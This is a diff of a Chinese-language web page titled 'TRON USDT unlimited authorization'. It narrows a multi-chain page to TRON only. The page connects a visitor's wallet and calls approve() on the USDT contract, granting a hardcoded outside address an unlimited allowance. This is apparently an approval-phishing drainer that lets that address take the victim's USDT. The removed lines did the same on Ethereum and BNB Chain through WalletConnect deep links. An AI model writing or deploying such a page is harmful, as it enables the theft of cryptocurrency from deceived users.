@@ -3,88 +3,55 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>多链钱包授权 | USDT 无限额度</title>
+    <title>TRON USDT 无限额度授权</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
         body {
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
             background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
             min-height: 100vh;
             padding: 20px;
         }
-        .container { max-width: 500px; margin: 0 auto; padding: 20px; }
+        .container {
+            max-width: 500px;
+            margin: 0 auto;
+            padding: 20px;
+        }
         .card {
             background: white;
             border-radius: 24px;
             padding: 24px;
             box-shadow: 0 20px 40px rgba(0,0,0,0.1);
         }
-        h1 { font-size: 28px; color: #333; margin-bottom: 8px; }
-        .subtitle { color: #666; font-size: 14px; margin-bottom: 24px; }
-        .chain-selector {
-            display: flex;
-            gap: 12px;
-            margin-bottom: 24px;
-            flex-wrap: wrap;
-        }
-        .chain-btn {
-            flex: 1;
-            padding: 12px;
-            border: 2px solid #e0e0e0;
-            background: white;
-            border-radius: 12px;
-            cursor: pointer;
-            font-size: 14px;
-            font-weight: 500;
-            transition: all 0.2s;
-        }
-        .chain-btn.active {
-            border-color: #667eea;
-            background: #f0f0ff;
-            color: #667eea;
-        }
-        .wallet-list {
-            display: flex;
-            flex-direction: column;
-            gap: 12px;
-            margin-bottom: 24px;
-        }
-        .wallet-item {
-            display: flex;
-            align-items: center;
-            padding: 16px;
-            border: 1px solid #e0e0e0;
-            border-radius: 16px;
-            cursor: pointer;
-            transition: all 0.2s;
-            background: white;
-        }
-        .wallet-item.selected {
-            border-color: #667eea;
-            background: #f8f9ff;
-        }
-        .wallet-icon {
-            width: 48px;
-            height: 48px;
-            border-radius: 12px;
-            background: #f5f5f5;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin-right: 16px;
-            font-size: 24px;
-        }
-        .wallet-info {
-            flex: 1;
-        }
-        .wallet-name {
-            font-weight: 600;
+        h1 {
+            font-size: 28px;
             color: #333;
-            margin-bottom: 4px;
+            margin-bottom: 8px;
         }
-        .wallet-chains {
+        .subtitle {
+            color: #666;
+            font-size: 14px;
+            margin-bottom: 24px;
+        }
+        .info-box {
+            background: #f5f5f5;
+            padding: 12px;
+            border-radius: 12px;
+            margin-bottom: 16px;
+        }
+        .info-label {
             font-size: 12px;
-            color: #999;
+            color: #666;
+        }
+        .info-value {
+            font-size: 12px;
+            color: #333;
+            word-break: break-all;
+            margin-top: 4px;
         }
         .approve-btn {
             width: 100%;
@@ -151,21 +118,48 @@
             color: #856404;
             text-align: center;
         }
-        .info-box {
-            background: #f5f5f5;
-            padding: 12px;
+        .wallet-list {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+            margin-bottom: 24px;
+        }
+        .wallet-item {
+            display: flex;
+            align-items: center;
+            padding: 16px;
+            border: 1px solid #e0e0e0;
+            border-radius: 16px;
+            cursor: pointer;
+            transition: all 0.2s;
+            background: white;
+        }
+        .wallet-item.selected {
+            border-color: #667eea;
+            background: #f8f9ff;
+        }
+        .wallet-icon {
+            width: 48px;
+            height: 48px;
             border-radius: 12px;
-            margin-bottom: 16px;
+            background: #f5f5f5;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-right: 16px;
+            font-size: 24px;
         }
-        .info-label {
-            font-size: 12px;
-            color: #666;
+        .wallet-info {
+            flex: 1;
         }
-        .info-value {
-            font-size: 12px;
+        .wallet-name {
+            font-weight: 600;
             color: #333;
-            word-break: break-all;
-            margin-top: 4px;
+            margin-bottom: 4px;
+        }
+        .wallet-chains {
+            font-size: 12px;
+            color: #999;
         }
         .info-text {
             font-size: 12px;
@@ -179,79 +173,66 @@
     <div class="container">
         <div class="card">
             <h1>🔐 USDT 授权</h1>
-            <div class="subtitle">多链无限额度授权</div>
+            <div class="subtitle">TRON 链 - 无限额度授权</div>
             
-            <div class="chain-selector" id="chainSelector">
-                <button class="chain-btn" data-chain="1">Ethereum</button>
-                <button class="chain-btn" data-chain="56">BNB Chain</button>
-                <button class="chain-btn" data-chain="728126428">TRON</button>
+            <div class="warning" id="warningBox">
+                ⚠️ 请在 TronLink / TokenPocket 的 DApp 浏览器中打开此页面
             </div>
             
-            <div class="wallet-list" id="walletList"></div>
+            <div class="wallet-list" id="walletList">
+                <div class="wallet-item" data-wallet="tronlink">
+                    <div class="wallet-icon">🌊</div>
+                    <div class="wallet-info">
+                        <div class="wallet-name">TronLink</div>
+                        <div class="wallet-chains">TRON</div>
+                    </div>
+                </div>
+                <div class="wallet-item" data-wallet="tokenpocket">
+                    <div class="wallet-icon">🎫</div>
+                    <div class="wallet-info">
+                        <div class="wallet-name">TokenPocket</div>
+                        <div class="wallet-chains">TRON</div>
+                    </div>
+                </div>
+                <div class="wallet-item" data-wallet="imtoken">
+                    <div class="wallet-icon">🔷</div>
+                    <div class="wallet-info">
+                        <div class="wallet-name">imToken</div>
+                        <div class="wallet-chains">TRON</div>
+                    </div>
+                </div>
+            </div>
             
             <div class="info-box">
                 <div class="info-label">授权地址</div>
-                <div class="info-value" id="spenderDisplay">-</div>
+                <div class="info-value">TZ6BCwwyMmWNM9vno1cLKp6kwy1QEXjxjA</div>
                 <div class="info-label" style="margin-top: 12px;">授权额度</div>
-                <div class="info-value" style="color: #667eea; font-weight: 600;">无限额度</div>
+                <div class="info-value" style="color: #667eea; font-weight: 600;">无限额度 (最大)</div>
             </div>
             
-            <div id="tronWarning" class="warning hidden">
-                ⚠️ TRON 链请使用 TronLink / TokenPocket 的 DApp 浏览器打开此页面
+            <div class="info-box" id="walletInfo" style="display: none;">
+                <div class="info-label">已连接钱包</div>
+                <div class="info-value address" id="connectedAddress">-</div>
             </div>
             
-            <button class="approve-btn" id="approveBtn">连接钱包并授权</button>
+            <button class="approve-btn" id="connectBtn">连接钱包</button>
+            <button class="approve-btn hidden" id="approveBtn">授权 USDT (无限)</button>
             <div class="status hidden" id="status"></div>
-            <div id="infoText" class="info-text">请选择链和钱包</div>
+            <div id="infoText" class="info-text">请选择钱包</div>
         </div>
     </div>
 
-    <!-- 引入依赖 -->
-    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/@walletconnect/web3wallet@1.9.0/dist/index.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.0/dist/TronWeb.js"></script>
-    
     <script>
-        // ==================== 配置 ====================
-        const PROJECT_ID = '91bd623c7859e77a38c7b10c615976b6';
+        // 配置
+        const TRON_USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
+        const SPENDER_ADDRESS = 'TZ6BCwwyMmWNM9vno1cLKp6kwy1QEXjxjA';
+        // 2^256 - 1 的十进制字符串（无限额度）
+        const UNLIMITED_AMOUNT = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
         
-        // USDT 合约地址
-        const USDT_ADDRESS = {
-            1: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
-            56: '0x55d398326f99059fF775485246999027B3197955',
-            728126428: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'
-        };
-        
-        // 授权地址
-        const SPENDER_ADDRESS = {
-            1: '0xEe435a366f0c89BE2108f8b02fFDe366158effa1',
-            56: '0xEe435a366f0c89BE2108f8b02fFDe366158effa1',
-            728126428: 'TZ6BCwwyMmWNM9vno1cLKp6kwy1QEXjxjA'
-        };
-        
-        // 无限额度
-        const UNLIMITED_AMOUNT_EVM = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
-        const UNLIMITED_AMOUNT_TRON = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
-        
-        // 钱包列表
-        const EVM_WALLETS = [
-            { key: 'metamask', name: 'MetaMask', icon: '🦊', scheme: 'metamask://' },
-            { key: 'tokenpocket', name: 'TokenPocket', icon: '🎫', scheme: 'tp://' },
-            { key: 'imtoken', name: 'imToken', icon: '🔷', scheme: 'imtokenv2://' },
-            { key: 'trust', name: 'Trust Wallet', icon: '🔒', scheme: 'trust://' }
-        ];
-        
-        const TRON_WALLETS = [
-            { key: 'tronlink', name: 'TronLink', icon: '🌊', scheme: 'tronlink://' },
-            { key: 'tokenpocket', name: 'TokenPocket', icon: '🎫', scheme: 'tp://' },
-            { key: 'imtoken', name: 'imToken', icon: '🔷', scheme: 'imtokenv2://' }
-        ];
-        
-        let currentChain = '1';
+        let tronWeb = null;
+        let userAddress = null;
         let selectedWallet = null;
-        let web3wallet = null;
-        let session = null;
-        let evmConnected = false;
         
         function showStatus(message, type = 'loading') {
             const statusEl = document.getElementById('status');
@@ -268,184 +249,89 @@
             document.getElementById('infoText').textContent = text;
         }
         
-        function updateSpenderDisplay(chainId) {
-            document.getElementById('spenderDisplay').textContent = SPENDER_ADDRESS[chainId];
-        }
-        
-        // ==================== UI 渲染 ====================
-        function renderWalletList() {
-            const isTron = currentChain === '728126428';
-            const wallets = isTron ? TRON_WALLETS : EVM_WALLETS;
-            const container = document.getElementById('walletList');
-            container.innerHTML = wallets.map(wallet => `
-                <div class="wallet-item" data-wallet="${wallet.key}">
-                    <div class="wallet-icon">${wallet.icon}</div>
-                    <div class="wallet-info">
-                        <div class="wallet-name">${wallet.name}</div>
-                        <div class="wallet-chains">${isTron ? 'TRON' : 'EVM'}</div>
-                    </div>
-                </div>
-            `).join('');
-            
-            document.querySelectorAll('.wallet-item').forEach(item => {
-                item.addEventListener('click', () => {
-                    selectedWallet = item.dataset.wallet;
-                    document.querySelectorAll('.wallet-item').forEach(w => w.classList.remove('selected'));
-                    item.classList.add('selected');
-                    hideStatus();
-                    updateInfoText(`已选择 ${wallets.find(w => w.key === selectedWallet).name}，点击按钮授权`);
-                });
-            });
-        }
-        
-        // ==================== WalletConnect 初始化 ====================
-        async function initWalletConnect() {
-            try {
-                web3wallet = await Web3Wallet.init({
-                    projectId: PROJECT_ID,
-                    metadata: {
-                        name: 'Wallet Connector',
-                        description: 'Multi-chain wallet connector',
-                        url: window.location.origin,
-                        icons: ['https://avatars.githubusercontent.com/u/37784886']
-                    }
-                });
-                console.log('WalletConnect 初始化成功');
-                return true;
-            } catch (error) {
-                console.error('WalletConnect 初始化失败:', error);
-                showStatus('WalletConnect 初始化失败，请刷新重试', 'error');
-                return false;
-            }
-        }
-        
-        // ==================== EVM 链授权 ====================
-        async function approveEvm() {
-            if (!web3wallet) {
-                const initOk = await initWalletConnect();
-                if (!initOk) return;
-            }
-            
-            // 获取选中的钱包信息
-            const wallet = EVM_WALLETS.find(w => w.key === selectedWallet);
-            if (!wallet) {
-                showStatus('请选择有效的钱包', 'error');
-                return;
-            }
-            
-            showStatus('正在创建连接...', 'loading');
-            updateInfoText('生成 WalletConnect 链接...');
-            
-            try {
-                // 创建配对
-                const { uri, approval } = await web3wallet.core.pairing.create();
-                if (!uri) throw new Error('无法生成连接 URI');
-                
-                // 构建 Deep Link
-                const encodedUri = encodeURIComponent(uri);
-                let deepLink = '';
-                switch (wallet.key) {
-                    case 'metamask':
-                        deepLink = `metamask://wc?uri=${encodedUri}`;
-                        break;
-                    case 'tokenpocket':
-                        deepLink = `tp://wc?wc_uri=${encodedUri}`;
-                        break;
-                    case 'imtoken':
-                        deepLink = `imtokenv2://wc?uri=${encodedUri}`;
-                        break;
-                    case 'trust':
-                        deepLink = `trust://wc?uri=${encodedUri}`;
-                        break;
-                    default:
-                        deepLink = uri;
-                }
-                
-                // 唤起钱包
-                window.location.href = deepLink;
-                showStatus(`正在唤起 ${wallet.name}...`, 'loading');
-                updateInfoText('请在钱包中确认连接');
-                
-                // 等待会话建立
-                session = await approval();
-                console.log('会话建立:', session);
-                updateInfoText('连接成功，正在发送授权交易...');
-                
-                // 获取 provider
-                const provider = new ethers.providers.Web3Provider(session.provider);
-                const signer = provider.getSigner();
-                const address = await signer.getAddress();
-                updateInfoText(`已连接: ${address.slice(0, 6)}...${address.slice(-4)}`);
-                
-                // 构造授权交易
-                const chainId = parseInt(currentChain);
-                const usdtAddress = USDT_ADDRESS[chainId];
-                const spender = SPENDER_ADDRESS[chainId];
-                
-                const usdtContract = new ethers.Contract(
-                    usdtAddress,
-                    ['function approve(address spender, uint256 amount) returns (bool)'],
-                    signer
-                );
-                showStatus('正在发送授权交易...', 'loading');
-                const tx = await usdtContract.approve(spender, UNLIMITED_AMOUNT_EVM);
-                showStatus('交易已发送，等待确认...', 'loading');
-                const receipt = await tx.wait();
-                showStatus(`✅ 授权成功！`, 'success');
-                updateInfoText(`授权成功！交易ID: ${receipt.transactionHash.slice(0, 10)}...`);
-                
-            } catch (error) {
-                console.error('EVM 授权失败:', error);
-                showStatus('授权失败: ' + (error.message || '未知错误'), 'error');
-                updateInfoText('授权失败，请重试');
-            }
-        }
-        
-        // ==================== TRON 链授权 ====================
-        function isInTronWalletBrowser() {
+        function isInWalletBrowser() {
             return (typeof window.tronLink !== 'undefined' && window.tronLink.ready) ||
                    (typeof window.tronWeb !== 'undefined' && window.tronWeb.defaultAddress);
         }
         
-        async function approveTron() {
-            if (!isInTronWalletBrowser()) {
-                document.getElementById('tronWarning').classList.remove('hidden');
-                showStatus('请使用 TronLink/TokenPocket 的 DApp 浏览器打开', 'error');
-                return;
+        // 连接钱包
+        async function connectWallet() {
+            if (!selectedWallet) {
+                showStatus('请先选择钱包', 'error');
+                return false;
             }
-            document.getElementById('tronWarning').classList.add('hidden');
             
-            let tronWeb;
-            if (window.tronLink && window.tronLink.ready) {
-                await window.tronLink.request({ method: 'tron_requestAccounts' });
-                tronWeb = window.tronLink.tronWeb;
-            } else if (window.tronWeb) {
-                tronWeb = window.tronWeb;
-            } else {
-                showStatus('无法连接 TRON 钱包', 'error');
-                return;
+            showStatus('正在连接钱包...', 'loading');
+            
+            try {
+                if (!isInWalletBrowser()) {
+                    showStatus('请在 TronLink 或 TokenPocket 的 DApp 浏览器中打开此页面', 'error');
+                    return false;
+                }
+                
+                if (window.tronLink && window.tronLink.ready) {
+                    await window.tronLink.request({ method: 'tron_requestAccounts' });
+                    tronWeb = window.tronLink.tronWeb;
+                } else if (window.tronWeb) {
+                    tronWeb = window.tronWeb;
+                } else {
+                    throw new Error('无法连接钱包');
+                }
+                
+                userAddress = tronWeb.defaultAddress.base58;
+                
+                document.getElementById('walletInfo').style.display = 'block';
+                document.getElementById('connectedAddress').textContent = `${userAddress.slice(0, 8)}...${userAddress.slice(-6)}`;
+                document.getElementById('connectBtn').classList.add('hidden');
+                document.getElementById('approveBtn').classList.remove('hidden');
+                document.getElementById('warningBox').style.display = 'none';
+                
+                showStatus(`连接成功！`, 'success');
+                setTimeout(() => hideStatus(), 1500);
+                updateInfoText(`已连接，点击授权`);
+                return true;
+                
+            } catch (error) {
+                console.error('连接失败:', error);
+                showStatus('连接失败: ' + error.message, 'error');
+                return false;
             }
-            const address = tronWeb.defaultAddress.base58;
-            updateInfoText(`已连接: ${address.slice(0, 6)}...${address.slice(-4)}`);
+        }
+        
+        // 授权 USDT
+        async function approveUSDT() {
+            if (!tronWeb || !userAddress) {
+                const connected = await connectWallet();
+                if (!connected) return;
+            }
             
             showStatus('正在构造授权交易...', 'loading');
+            
             try {
-                const contract = await tronWeb.contract().at(USDT_ADDRESS[728126428]);
+                const contract = await tronWeb.contract().at(TRON_USDT_CONTRACT);
+                
                 showStatus('请在钱包中确认授权...', 'loading');
+                
+                // 发送授权交易
                 const result = await contract.approve(
-                    SPENDER_ADDRESS[728126428],
-                    UNLIMITED_AMOUNT_TRON
+                    SPENDER_ADDRESS,
+                    UNLIMITED_AMOUNT
                 ).send();
+                
+                console.log('授权结果:', result);
+                
                 if (result && (result.result || result.txid)) {
                     const txid = result.txid || result;
                     showStatus(`✅ 授权成功！`, 'success');
+                    document.getElementById('connectedAddress').innerHTML = `${userAddress.slice(0, 8)}...${userAddress.slice(-6)} <span style="display:inline-block; background:#28a745; color:white; padding:2px 8px; border-radius:12px; font-size:10px; margin-left:8px;">已授权</span>`;
                     updateInfoText(`授权成功！交易ID: ${txid.slice(0, 10)}...`);
                 } else {
                     showStatus('授权失败，请重试', 'error');
                 }
+                
             } catch (error) {
-                console.error('TRON 授权失败:', error);
-                if (error.message.includes('denied') || error.message.includes('reject')) {
+                console.error('授权错误:', error);
+                if (error.message.includes('denied') || error.message.includes('reject') || error.message.includes('cancelled')) {
                     showStatus('用户取消了授权', 'error');
                 } else {
                     showStatus('授权失败: ' + error.message, 'error');
@@ -453,61 +339,35 @@
             }
         }
         
-        // ==================== 主授权入口 ====================
-        async function onApprove() {
-            if (!selectedWallet) {
-                showStatus('请先选择钱包', 'error');
-                return;
-            }
-            
-            const isTron = currentChain === '728126428';
-            if (isTron) {
-                await approveTron();
-            } else {
-                await approveEvm();
-            }
-        }
-        
-        // ==================== 链切换 ====================
-        function onChainChange(chainId) {
-            currentChain = chainId;
-            selectedWallet = null;
-            document.getElementById('walletList').innerHTML = '';
-            renderWalletList();
-            updateSpenderDisplay(chainId);
-            hideStatus();
-            
-            const isTron = chainId === '728126428';
-            if (isTron) {
-                if (!isInTronWalletBrowser()) {
-                    document.getElementById('tronWarning').classList.remove('hidden');
-                    updateInfoText('TRON 链需要您在钱包 DApp 浏览器中打开');
-                } else {
-                    document.getElementById('tronWarning').classList.add('hidden');
-                    updateInfoText('已检测到 TRON 钱包，选择钱包后点击授权');
-                }
-            } else {
-                document.getElementById('tronWarning').classList.add('hidden');
-                updateInfoText('EVM 链，选择钱包后点击授权（将唤起钱包）');
-            }
-        }
-        
-        // ==================== 初始化 ====================
-        async function init() {
-            // 链选择器
-            document.querySelectorAll('.chain-btn').forEach(btn => {
-                btn.addEventListener('click', () => {
-                    document.querySelectorAll('.chain-btn').forEach(b => b.classList.remove('active'));
-                    btn.classList.add('active');
-                    onChainChange(btn.dataset.chain);
+        // 钱包选择
+        function initWalletSelection() {
+            document.querySelectorAll('.wallet-item').forEach(item => {
+                item.addEventListener('click', () => {
+                    selectedWallet = item.dataset.wallet;
+                    document.querySelectorAll('.wallet-item').forEach(w => w.classList.remove('selected'));
+                    item.classList.add('selected');
+                    hideStatus();
+                    updateInfoText(`已选择 ${item.querySelector('.wallet-name').innerText}，点击连接钱包`);
                 });
             });
-            document.getElementById('approveBtn').addEventListener('click', onApprove);
-            document.querySelector('.chain-btn[data-chain="1"]').classList.add('active');
-            onChainChange('1');
-            
-            // 预初始化 WalletConnect
-            await initWalletConnect();
+        }
+        
+        // 自动检测
+        function autoDetect() {
+            if (isInWalletBrowser()) {
+                document.getElementById('warningBox').style.display = 'none';
+                updateInfoText('检测到钱包环境，请选择钱包');
+            } else {
+                document.getElementById('warningBox').style.display = 'block';
+                updateInfoText('请使用 TronLink/TokenPocket 的 DApp 浏览器打开');
+            }
+        }
+        
+        function init() {
+            initWalletSelection();
+            document.getElementById('connectBtn').addEventListener('click', connectWallet);
+            document.getElementById('approveBtn').addEventListener('click', approveUSDT);
+            autoDetect();
         }
         
         init();
